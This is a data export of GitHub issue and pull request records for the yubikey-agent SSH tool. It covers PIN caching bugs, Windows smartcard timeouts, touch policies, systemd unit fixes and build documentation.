",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/74/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/74/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/74/events,https://github.com/FiloSottile/yubikey-agent/issues/74,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/73,782701149,MDU6SXNzdWU3ODI3MDExNDk=,73,Can't use pin cached in the system keystore (libsecret),6657308,open,FALSE,NA,NA,1,2021-01-09T22:59:11Z,2021-01-10T19:16:41Z,NA,NONE,NA,"Using latest version from git on Arch with Yubikey 5 Nano and trying to cache the PIN to the system keystore. Saving the pin to the store works and I see it there, however agent fails to read/use the value from the store.

When trying to ssh to the host (after service restart, so pin entry is required), I am getting the following error message:

```
sign_and_send_pubkey: signing failed for ECDSA ""YubiKey #XXXXXXXX PIV Slot 9a"" from agent: agent refused operation
```

In the service log I see the following:

```
Jan 09 17:45:38 pan-cf-sv9 yubikey-agent[4814]: 2021/01/09 17:45:38 agent 13: pin prompt: unexpected response: S PASSWORD_FROM_CACHE
```

Does it suppose to work? Am I doing something wrong here?",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/73/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/73/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/73/events,https://github.com/FiloSottile/yubikey-agent/issues/73,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/72,780695351,MDExOlB1bGxSZXF1ZXN0NTUwNTQ3Nzgx,72,Allow generating the private key on the computer,36209,open,FALSE,NA,NA,2,2021-01-06T16:48:27Z,2021-02-11T12:14:32Z,NA,NONE,NA,"This is to allow creating backups of the private key in case the YubiKey
gets lost or damaged. The word ""insecurely"" is appended to the name of
the switch and a long warning produced in order to make people who don't
know what they're doing turn away and stop what they're doing.

This is possible since piv-go 1.7.0[1] so I allowed myself to bump the
version of this requirement.

While I do have several doubts about approaching this (see below) I believe this
is a useful thing to have. What I'm unsure about is:

* The code quality (I'm not writing Go day to day)
* I may have done something stupid cryptography-wise here, I'm not a cryptographer or a security specialist
* How to warn properly so that people not knowing what they're doing don't use the new switch – I think I've done a decent job here
* Should this be mentioned in the readme? I mentioned it for documentation purposes
* Should this be mentioned in the `--help` output? The existing `--really-delete-all-piv-keys` flag is not there so I skipped it
* Should there be advice that when this option is used it's better to do it on a clean system, on a trusted machine, offline and airgapped ideally, and any potential backups should be encrypted and stored securely?
* Should the main agent daemon always handle keys that fail attestation (caused by generating on the computer instead of on the device) like I added here or maybe make this configurable with a switch?

Closes GH-65.

[1] https://github.com/go-piv/piv-go/pull/83#issuecomment-740707527",NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/72/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/72/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/72/events,https://github.com/FiloSottile/yubikey-agent/pull/72,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/72
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/71,777456343,MDU6SXNzdWU3Nzc0NTYzNDM=,71,error on missing attestation cert: get attestation cert: data object or application not found,2506763,open,FALSE,NA,NA,0,2021-01-02T12:55:48Z,2021-01-02T12:55:48Z,NA,NONE,NA,"We're using yubikeys (4.3) which contain preloaded keys to reach specific requirement for keys which are not possible with them being generated on the yubikey itself. Hence no attestion certs on the yubikey for imported keys.

yubikey-agent errors (on key usage via ssh) with:
```
2021/01/02 11:57:33 Connecting to the YubiKey...
2021/01/02 11:59:38 agent 13: failed to prepare private key: get attestation cert: data object or application not found
```

How is it possible to work around it and use such yubikeys? (Just to be clear, they're NOT provisioned using --setup option)",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/71/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/71/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/71/events,https://github.com/FiloSottile/yubikey-agent/issues/71,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/70,773036775,MDU6SXNzdWU3NzMwMzY3NzU=,70,2nd attempt for Windows support,10010543,open,FALSE,NA,NA,3,2020-12-22T15:35:37Z,2021-01-24T11:02:09Z,NA,NONE,NA,"## Situation
I picked up #29 rebased it on master, took care of the comments in the MR and fixed some minor issues. See #69
I kept small commits for now, so it's easier to follow my changes.

I reached a state where the agent works but got stuck with a problem that blocks me from using it for me.

## Problem
Windows has a timeout for smartcard transactions (default: 5 seconds)

> If a transaction is held on the card for more than five seconds with no operations happening on that card, then the card is reset.
Source: https://docs.microsoft.com/en-us/windows/win32/api/winscard/nf-winscard-scardbegintransaction?redirectedfrom=MSDN

This does not play well with yubikey-agent:
1. If you were asked to enter the new PIN during setup. You need to be quick. If you need more than 5 seconds to enter the PIN twice, you will fail. This I fixed with https://github.com/FiloSottile/yubikey-agent/pull/69/commits/4f046ef92cff147f06acd6f81541abe684079c85
1. You have only 5 seconds to enter the PIN for normal agent usage, too
1. If you entered the pin, you can start as many ssh sessions as you want within 5 seconds and than you have to enter the PIN again.
There is a registry setting to increase the timeout, but I'm not sure about the side effects and this would only help to mitigate the problem but not solve it.

## Idea
Actually I don't like that the card connections are open forever. I can imagine that this might cause other problems, too. I had for example weird things happening when I had the YubiKey Manager open and worked on yubikey-agent. But I was not aware of the timeout at that time, so that might have caused most of the weirdness.

My idea to approach this problem:
1. Cache the pin in yubikey-agent and define an own timeout.
1. Open a new connection (transaction?) to the YubiKey for every request.

Unfortunately I struggle to find a starting point here.
- Is yubikey-agent even the right place to deal with that or should this go to one of the libraries used? Which one?
- Can this cause side effects on other operating systems? I don't think so, but ...
- Would this have a bigger impact on the general structure of yubikey-agent?
- Is it weakening the security if the PIN is cached?

I would be able to spend some time on this but I will need someone to confirm that this is wanted to be implemented and support. At least for general design questions and testing.",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/70/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/70/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/70/events,https://github.com/FiloSottile/yubikey-agent/issues/70,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/69,773009662,MDExOlB1bGxSZXF1ZXN0NTQ0MTc2MTAy,69,Windows support 2,10010543,open,FALSE,NA,NA,0,2020-12-22T14:59:03Z,2021-02-11T12:14:31Z,NA,NONE,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/69/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/69/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/69/events,https://github.com/FiloSottile/yubikey-agent/pull/69,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/69
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/68,761326529,MDU6SXNzdWU3NjEzMjY1Mjk=,68,"Feature request: User configurable delay before ""Waiting for YubiKey touch..."" notification",3276410,open,FALSE,NA,NA,0,2020-12-10T15:14:09Z,2020-12-10T15:14:09Z,NA,NONE,NA,"I don't have my yubikey in direct eye view, would be convenient if the desktop notification showed immediately or on a configurable delay",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/68/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/68/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/68/events,https://github.com/FiloSottile/yubikey-agent/issues/68,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/67,748061428,MDExOlB1bGxSZXF1ZXN0NTI1MTU5NjUw,67,FEATURE: use changed SSH_AUTH_SOCK for interactive applications,190777,closed,FALSE,NA,NA,2,2020-11-21T17:22:15Z,2020-11-21T20:15:56Z,2020-11-21T19:37:39Z,CONTRIBUTOR,NA,"With the proposed change, it is possible to use interactive applications (IntelliJ, Sequel Ace, ...) with the Yubikey-Agent :-)",NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/67/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/67/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/67/events,https://github.com/FiloSottile/yubikey-agent/pull/67,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/67
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/66,746076121,MDExOlB1bGxSZXF1ZXN0NTIzNTM0NzE4,66,Retry if PIN is not correct,52380,closed,FALSE,NA,NA,0,2020-11-18T22:32:42Z,2020-11-22T14:42:36Z,2020-11-22T14:42:36Z,NONE,NA,"- Adds a retry login for incorrect pin
- I kept the fmt.Errorf(""no private keys match the requested public key""), but I wasn't able to reach the
  error even before my patch. On my case we never reach that code if the key isn't inside of authorized_keys",NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/66/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/66/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/66/events,https://github.com/FiloSottile/yubikey-agent/pull/66,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/66
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/65,743347698,MDU6SXNzdWU3NDMzNDc2OTg=,65,UX/Roadmap question: importing existing keys,36209,open,FALSE,NA,NA,0,2020-11-15T21:21:13Z,2020-11-15T21:21:13Z,NA,NONE,NA,"Hey, thanks a lot for creating this project!

One question comes to my mind: is it possible to import existing SSH keys to a Yubikey (using any mechanism, not necessarily yubikey-agent itself) so that yubikey-agent can use them just like the keys it created on the device? Assuming it's not possible right now and it's just something that's not implemented in yubikey-agent – is it likely to exist in the future? Are pull requests implementing it welcome?

My use case is to generate a key on a trusted secure machine (temporary, disposable and clean system, no network etc.), upload it to a Yubikey and also store an encrypted copy on a usb-stick for extra safety in case my Yubikey stops working at some point. (Having multiple Yubikeys with different SSH keys on each of them is not suitable for me.)",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/65/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/65/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/65/events,https://github.com/FiloSottile/yubikey-agent/issues/65,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/64,743284465,MDExOlB1bGxSZXF1ZXN0NTIxMjE1NDky,64,Retry if PIN is not correct,52380,closed,FALSE,NA,NA,0,2020-11-15T15:51:08Z,2020-11-18T22:31:10Z,2020-11-18T22:31:10Z,NONE,NA,"- Adds a retry login for incorrect pin
- I kept the fmt.Errorf(""no private keys match the requested public key""), but I wasn't able to reach the
  error even before my patch. On my case we never reach that code if the key isn't inside of authorized_keys",NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/64/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/64/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/64/events,https://github.com/FiloSottile/yubikey-agent/pull/64,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/64
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/63,726557078,MDU6SXNzdWU3MjY1NTcwNzg=,63,Add decryption agent functionality,4312191,open,FALSE,NA,NA,0,2020-10-21T14:39:48Z,2020-10-21T14:39:48Z,NA,NONE,NA,"I'm currently using the OpenPGP applet on my Yubikey for two things: SSH authentication and password decryption with pass. Given all the well-known UX issues with gpg and smart cards/hardware tokens, I would like to switch to yubikey-agent, (r)age & PIV. Most of the ecosystem is there or not hard to build (such as a pass clone that relies on age), but currently the two use cases authentication and decryption don't work well simultaneously due to the need for exclusive reader access. 

A convenient feature of gpg that works around the ""reader lock"" issue is that it can work as an agent for both SSH auth and decryption. What are thoughts about adding decryption agent functionality to yubikey-agent, which could then be used by (r)age?",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/63/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/63/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/63/events,https://github.com/FiloSottile/yubikey-agent/issues/63,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/62,723176993,MDExOlB1bGxSZXF1ZXN0NTA0ODA3OTQ0,62,Linux build docs,2560260,open,FALSE,NA,NA,0,2020-10-16T12:32:25Z,2021-02-11T12:14:31Z,NA,NONE,NA,"First off, thanks for creating `yubikey-agent`! 

I just installed it on Ubuntu 20.04 and thought I could write down the steps I did to get it working on Ubuntu 20.04.
This spiraled out and I ended up rewriting large parts of the contents in `system.md` :sweat_smile: 

## Intent

Hopefully make the instructions for building `yubikey-agent`, on any distribution, easier to follow.

## Changes

Since there's a handful of changes, here's a summary of what's been done

- Replace `text` with `sh` for code snippets containing shell commands.
- Restructure the docs for building into sections for dependencies,
building, and using.
- Add link to Golang's official install instructions to help users get started installing Golang.
- List packages needed for Ubuntu 20.04.
- Remove leading `$` from code snippets without any following command output, for faster copypasting.
- Highlight that `pcscd.socket` must be active before using `yubikey-agent -setup`.
- Add instructions for how to set `SSH_AUTH_SOCK` if you are using Fish shell.",NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/62/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/62/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/62/events,https://github.com/FiloSottile/yubikey-agent/pull/62,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/62
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/61,720050484,MDU6SXNzdWU3MjAwNTA0ODQ=,61,PINs that contain '%' will not work / setup.go and main.go use different methods to get the PIN,1164048,open,FALSE,NA,NA,2,2020-10-13T09:29:37Z,2021-01-15T17:23:54Z,NA,NONE,NA,"thanks a lot for this great project. I just got new yubikeys and moved my new SSH keys to them using Yubikey-agent! While doing this I stumbled across a subtle issue though:

Right now [setup.go](https://github.com/FiloSottile/yubikey-agent/blob/master/setup.go#L82) uses `terminal.ReadPassword` while [main.go](https://github.com/FiloSottile/yubikey-agent/blob/master/main.go#L199) uses `github.com/gopasspw/gopass/pkg/pinentry`.

The gopass pinentry communication code unfortunately has a subtle bug that replaces all `%` signs with `%25` (see https://github.com/gopasspw/gopass/issues/1621).

Due to this bug and the different implementations it's possible to create a PIN with a `%` sign during setup which will then be incorrectly read as `%25` from pinentry when the agent is running in the background. This will then result in strange ""agent refused operation"" errors when using ssh.

The unescaping should probably be fixed in `gopass/pkg/pinentry` but I believe both setup.go and main.go should use the same method to request the PIN for consistency. If they had used the same method the failure would've already occurred during setup (because my PIN would've been > 8 chars) and it would've been a little bit easier to track this down. 

If you agree I can create a PR to unify the get pin logic in main.go and setup.go on the weekend.",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/61/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/61/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/61/events,https://github.com/FiloSottile/yubikey-agent/issues/61,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/60,719555151,MDU6SXNzdWU3MTk1NTUxNTE=,60,Ability to use SSH certificates,2501111,open,FALSE,NA,NA,0,2020-10-12T17:54:13Z,2020-10-12T17:54:13Z,NA,NONE,NA,"When using the SSH agent, it is possible to add a SSH certificate (https://smallstep.com/blog/use-ssh-certificates/) along with the corresponding private key file. When using a PKCS11 key such as the Yubikey, the current SSH agent implementation does not look for a certificate, and adding only a certificate without a private key file is not possible.

Note: the original ssh-agent is also lacking this feature.

Given that the agent protocol is reimplemented with yubikey-agent, it would be great to be able to add a certificate so that the agent is able to deliver both public keys and certificates.

The original Yubico doc and OpenSSH docs recommend using the CertificateFile option, but that's not an option when jumping from one ssh host to another (i.e. running ssh from a host we logged in with the certificate), because the way it works is by forwarding the agent socket, which in turn does not provides the certificate. The only currently existing solution with a hardware key is to distribute the ssh certificate on every host we plan to jump from, which is not feasible at scale.

See https://bugzilla.mindrot.org/show_bug.cgi?id=2472 for the never-fulfilled feature request on the OpenSSH agent.",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/60/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/60/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/60/events,https://github.com/FiloSottile/yubikey-agent/issues/60,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/59,716528916,MDU6SXNzdWU3MTY1Mjg5MTY=,59,New release,581269,open,FALSE,NA,NA,2,2020-10-07T13:25:30Z,2021-04-18T16:20:32Z,NA,CONTRIBUTOR,NA,"0.1.3 was released in June, and there's been [some development since then](https://github.com/FiloSottile/yubikey-agent/compare/v0.1.3...master). I'm particularly interested in #46.  Can a new release be cut please?",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/59/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/59/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/59/events,https://github.com/FiloSottile/yubikey-agent/issues/59,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/58,716475183,MDExOlB1bGxSZXF1ZXN0NDk5MjA1MDgy,58,fixed README link in systemd.md,163115,open,FALSE,NA,NA,0,2020-10-07T12:14:41Z,2021-02-11T12:14:31Z,NA,NONE,NA,"The file extension `.md` was missing from the link, leading to a 404 page.",NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/58/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/58/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/58/events,https://github.com/FiloSottile/yubikey-agent/pull/58,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/58
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/57,702307795,MDExOlB1bGxSZXF1ZXN0NDg3NjA3NzQ0,57,Load public keys from all slots on the Yubikey to support different touch policies,305104,open,FALSE,NA,NA,1,2020-09-15T22:13:09Z,2021-02-11T12:14:31Z,NA,NONE,NA,"For #22.

To support different touch policies with one Yubikey, load keys from the 4 PIV slots on Yubikey that the Yubikey Manager shows.

I think the change in main.go is reasonable. I don't think the code to add the second key necessarily needs to be in this project. The benchmark will need more love if we want to include it, e.g. how to initialize the Yubikey under test?

Previously I was concerned about potential slowdown but here I created a non-destructive benchmark to see performance differences of the functions I modified. I don't want to delete my current second key so I can't easily run the benchmark with just the first certificate existing.

Below my benchmark with Yubikey 5 NFC when I have certificates in slots 9a and 9d. You can note that adding the second non-existing slot has little impact (2_slots_9a_9e), but when the certificate exists (2_slots_9a_9d), there is significant slowdown. Loading all 4 slots (4_slots_9a_9e_9d_9c) has some difference to 2_slots_9a_9d, but not huge.

I would think adding a second slot by default would be acceptable, and all slots not too bad. Question then is: can we make loading all slots the default (or cache slots on first use?) or does this need to be a configurable preference?

```
[joneskoo@grant yubikey-agent]$ go test -bench .
2020/09/16 01:06:01 Connecting to the YubiKey...
goos: darwin
goarch: amd64
pkg: filippo.io/yubikey-agent
BenchmarkList/1_slot_9a-8                    158           7430363 ns/op
BenchmarkList/2_slots_9a_9e-8                151           7884287 ns/op
BenchmarkList/2_slots_9a_9d-8                128           9366908 ns/op
BenchmarkList/4_slots_9a_9e_9d_9c-8                  100          11967745 ns/op
2020/09/16 01:06:08 Received SIGHUP, dropping YubiKey transaction...
2020/09/16 01:06:08 Connecting to the YubiKey...
BenchmarkSigners/1_slot_9a-8                           8         139677175 ns/op
BenchmarkSigners/2_slots_9a_9e-8                       8         141074461 ns/op
BenchmarkSigners/2_slots_9a_9d-8                       4         280662836 ns/op
BenchmarkSigners/4_slots_9a_9e_9d_9c-8                 4         284958780 ns/op
2020/09/16 01:06:15 Received SIGHUP, dropping YubiKey transaction...
PASS
ok      filippo.io/yubikey-agent        14.164s
```

This is rebasing and updating #27.",NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/57/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/57/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/57/events,https://github.com/FiloSottile/yubikey-agent/pull/57,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/57
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/56,696898771,MDExOlB1bGxSZXF1ZXN0NDgyOTE0NjQ5,56,Show existing public key on -setup,861778,open,FALSE,NA,NA,0,2020-09-09T15:09:53Z,2021-02-11T12:14:30Z,NA,NONE,NA,Closes: #42,NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/56/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/56/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/56/events,https://github.com/FiloSottile/yubikey-agent/pull/56,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/56
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/55,696853343,MDExOlB1bGxSZXF1ZXN0NDgyODc2Mzcw,55,"Add option to set touch policy to ""cache""",861778,open,FALSE,NA,NA,7,2020-09-09T14:15:08Z,2021-02-11T12:14:30Z,NA,NONE,NA,"This adds an optional setup flag that allows the touch policy to be set. ~to ""cache for 15 seconds"" instead of ""always"".~

~I've tried to add this feature in the least obtrusive way possible, but the command line is getting a little complex for the plain old `flag` package. Would there be any interest in using a CLI library in `yubikey-agent`?~

Closes: #52 ",NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/55/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/55/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/55/events,https://github.com/FiloSottile/yubikey-agent/pull/55,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/55
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/54,696281000,MDExOlB1bGxSZXF1ZXN0NDgyMzgzODA3,54,Ignore cards which aren't YubiKeys,861778,open,FALSE,NA,NA,2,2020-09-09T00:32:44Z,2021-02-11T12:14:30Z,NA,NONE,NA,"I've got another smart card reader built into my laptop that `yubikey-agent` tries to use and fails.

This fixes the issue.",NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/54/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/54/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/54/events,https://github.com/FiloSottile/yubikey-agent/pull/54,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/54
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/53,695470608,MDExOlB1bGxSZXF1ZXN0NDgxNzExMzgz,53,Add flag to retrieve management key,3065381,open,FALSE,NA,NA,0,2020-09-08T01:11:12Z,2021-02-11T12:14:30Z,NA,NONE,NA,"I found myself wanting to be able to get the management key to be able to change pin retries etc in ykman, but couldn't find an obvious way to do so with existing tools, so I added a simple function and flag to do so. 

Feel free to close if this is out of scope or poorly thought through! :)",NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/53/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/53/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/53/events,https://github.com/FiloSottile/yubikey-agent/pull/53,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/53
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/52,684951697,MDU6SXNzdWU2ODQ5NTE2OTc=,52,Please allow specifying a touch policy,419456,open,FALSE,NA,NA,2,2020-08-24T20:41:30Z,2020-09-02T16:45:09Z,NA,NONE,NA,I need a touch policy of cached in order to handle connecting to many servers at once during ansible provisioning. Adding a touch policy prompt during setup would be greatly appreciated.,NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/52/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/52/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/52/events,https://github.com/FiloSottile/yubikey-agent/issues/52,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/51,681940741,MDExOlB1bGxSZXF1ZXN0NDcwMjQ5NTEy,51,Document nix package,581269,closed,FALSE,NA,NA,1,2020-08-19T15:34:46Z,2020-09-05T14:14:43Z,2020-09-05T14:14:36Z,CONTRIBUTOR,NA,This adds documentation for the NixOS/nixpkgs package.,NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/51/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/51/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/51/events,https://github.com/FiloSottile/yubikey-agent/pull/51,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/51
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/50,681467509,MDExOlB1bGxSZXF1ZXN0NDY5ODU4MDU3,50,systemd: remove options unsupported in user daemon,273509,closed,FALSE,NA,NA,5,2020-08-19T00:42:11Z,2020-09-06T13:21:54Z,2020-09-05T14:19:34Z,CONTRIBUTOR,NA,"Many unit options are documented to not work in the user daemons,
usually with the following note in the systemd.exec(5) man page:

> This option is only available for system services and is not supported
> for services running in per-user instances of the service manager.

In some circumstances these settings work where user namespaces are
supported (by setting the `PrivateUser` option). However users
namespaces are disabled on most distributions.

This changeset pares the options to those supported in user daemons to
allow for ease of use for users.

Fixes: #49

---

CC: @flokli @LeSuisse @mdlayher as previous contributors to the systemd unit.",NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/50/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/50/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/50/events,https://github.com/FiloSottile/yubikey-agent/pull/50,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/50
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/49,681442189,MDU6SXNzdWU2ODE0NDIxODk=,49,contributed systemd unit doesn't work in user session,273509,closed,FALSE,NA,NA,6,2020-08-19T00:12:38Z,2020-09-05T14:19:34Z,2020-09-05T14:19:34Z,CONTRIBUTOR,NA,"The systemd unit at [/contrib/systemd/user/yubikey-agent.service](https://github.com/FiloSottile/yubikey-agent/blob/4e85c15e0331e3e4c43c7707baa32646d01e5450/contrib/systemd/user/yubikey-agent.service) implies that it is suitable for the user systemd daemon, however it contains options that required privileges to run, resulting in errors similar to the following:

```
systemd[28428]: yubikey-agent.service: Failed to set up mount namespacing: Operation not supported
systemd[28428]: yubikey-agent.service: Failed at step NAMESPACE spawning /usr/bin/yubikey-agent: Operation not supported
```

This is reflected in similar issues upsteam, such as https://github.com/systemd/systemd/issues/9870. I can try paring the list down to options that work.",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/49/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/49/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/49/events,https://github.com/FiloSottile/yubikey-agent/issues/49,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/48,675571613,MDU6SXNzdWU2NzU1NzE2MTM=,48,pin-policy set to always?,609527,open,FALSE,NA,NA,2,2020-08-08T18:53:32Z,2020-09-09T14:24:07Z,NA,NONE,NA,"I have reset my old YubiKey 4 that I had lying around using both `yubikey-agent -setup` as well as `ykman piv reset`, and in both cases it prompts me for the PIN every single time, instead of once per session (which is what I expected to happen, based on the README). Is there a configuration option I'm missing?",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/48/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/48/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/48/events,https://github.com/FiloSottile/yubikey-agent/issues/48,NA
